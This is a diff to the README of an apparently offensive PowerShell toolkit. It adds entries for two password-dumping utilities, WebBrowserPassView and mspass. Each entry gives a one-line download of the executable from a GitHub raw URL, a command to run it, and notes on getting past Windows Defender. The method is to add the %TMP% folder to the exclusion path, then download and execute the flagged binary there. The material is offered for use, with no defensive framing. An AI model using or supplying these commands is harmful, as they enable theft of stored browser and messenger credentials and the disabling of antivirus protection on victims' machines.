@@ -110,3 +110,69 @@ The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download
 Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (ChromePass.exe).
 Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver by -Uri parameter) at the end of execution.
 ```
+
+<br />
+
+## WebBrowserPassView.exe
+   
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|WebBrowserPassView|dumps usernames, passwords from major browsers|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[WebBrowserPassView - nirsoft](https://www.nirsoft.net/utils/web_browser_password.html)|
+
+<br />
+
+**downloadcmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe"
+```
+
+<br />
+
+**execute:**
+```powershell
+.\WebBrowserPassView.exe
+```
+
+<br />
+
+**Final Notes**
+```
+WebBrowserPassView.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
+The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute WebBrowserPassView.exe from that location.
+
+Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (WebBrowserPassView.exe).
+Warning: Invoke-Exclusions will 'NOT' delete itself or WebBrowserPassView.exe (deliver by -Uri parameter) at the end of execution.
+```
+
+<br />
+
+## mspass.exe.exe
+   
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|mspass.exe|dumps usernames, passwords of messeger applications|UserLand|[Invoke-Exclusions.ps1](https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#module-name) - Evade AV detection<br />[mspass - nirsoft](https://www.nirsoft.net/utils/mspass.html)|
+
+<br />
+
+**downloadcmdLet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/mspass.exe" -OutFile "mspass.exe"
+```
+
+<br />
+
+**execute:**
+```powershell
+.\mspass.exe
+```
+
+<br />
+
+**Final Notes**
+```
+mspass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
+The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute mspass.exe from that location.
+
+Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (mspass.exe).
+Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -Uri parameter) at the end of execution.
+```
